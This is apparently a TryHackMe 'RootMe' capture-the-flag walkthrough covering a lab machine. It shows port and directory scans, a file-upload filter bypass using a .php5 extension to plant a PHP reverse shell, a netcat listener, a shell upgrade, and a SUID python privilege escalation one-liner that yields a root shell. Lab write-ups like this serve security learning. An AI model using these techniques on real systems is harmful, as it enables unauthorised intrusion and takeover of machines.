## root Me - Try Hack Me

## 1. Overveiw

**NMAP**\
**Gobuster**\
**PHP-Rev-Shell**\
**File upload bypass**\
**SUID Priv Esc (GTFOBins)**\
[Link to the machine](https://tryhackme.com/room/rrootme)

## 2. Tasks
### 2.1 Scan the machine, how many ports are open?

```sh
export IP=10.10.161.239
```

First we do a **NMAP** scan:
```sh
nmap -sV -sC -oN nmap/initial $IP
```

This is the output of the nmap scan:
```sh
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-22 04:26 EDT                                                                                                                                                                           
Nmap scan report for 10.10.161.239                                                                                                                                                                                                         
Host is up (0.086s latency).                                                                                                                                                                                                               
Not shown: 998 closed ports                                                                                                                                                                                                                
PORT   STATE SERVICE VERSION                                                                                                                                                                                                               
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                                             
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```


### 2.2 What version of Apache are running?
Apache 2.4.29

### 2.3 What service is running on port 22?
ssh

### 2.4 Find directories on the web server using the GoBuster tool.
To run a **gobuster** scan we do the following:
```sh
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log
```

The output of the gobuster is as follows:
```sh
===============================================================
2020/09/22 04:34:51 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
/js (Status: 301)
/panel (Status: 301)
Progress: 30518 / 220561
```

### 2.5 What is the hidden directory?
`/panel`


## 3 user.txt

We got some hints to upload a php rev shell. The gobustercan showed that we can access the `/uploads/` tab.
Possibly we can get remote code execution with uploading a php script. We try to upload a `.php` file and we get an error.
So we can try multiple things, like changing the magic bytes so the php looks like a png or jpg file. We ended up using the `.php5` extension.
After a lot of testing, this was the link we followed in order to figure it out. I know Burp also has a possible way of fuzzing the extensions.

After uploading the script we set a netcat listener to the same port as specified in the php-reverse shell:

```sh
nc -lnvp 9001
```

Then we request the file in with this [URL](http://10.10.161.239/uploads/php-rev-shell.php5)

And we catch the shell back to us. We can now make it a little better with python:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then we use `ctr+z` to background the shell. And on our own machine we type:

```sh
stty raw -echo
fg
```

This should spwan a better shell to work with.
In order to find the user.txt file, we can simply use the `find` command:

```sh
find . -name "user.txt" 2>/dev/null
```

## 4 root.txt

Here we have to look for some SUID misconfigs on the box.


### 4.1 Search for files with SUID permission, which file is weird?
use this [link](https://www.thegeekdiary.com/linux-unix-how-to-find-files-which-has-suid-sgid-set/) in order to search for files with root permission. The answer to the weird file is:
 
`/usr/bin/python`

### 4.2 Find a form to escalate your privileges.

We use the hint given from the 4.1 section, and go to GTFOBins in order to find python:
https://gtfobins.github.io/gtfobins/python/

Under *SUID* there is a section covering how to privesc if python has SUID permiussions.
If we execute this command we can spawn a root shell:

```python
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

And we get a root shell!
Then we use `find` to check where the root.txt file is:

```sh
find . -name "root.txt" 2>/dev/nul
```
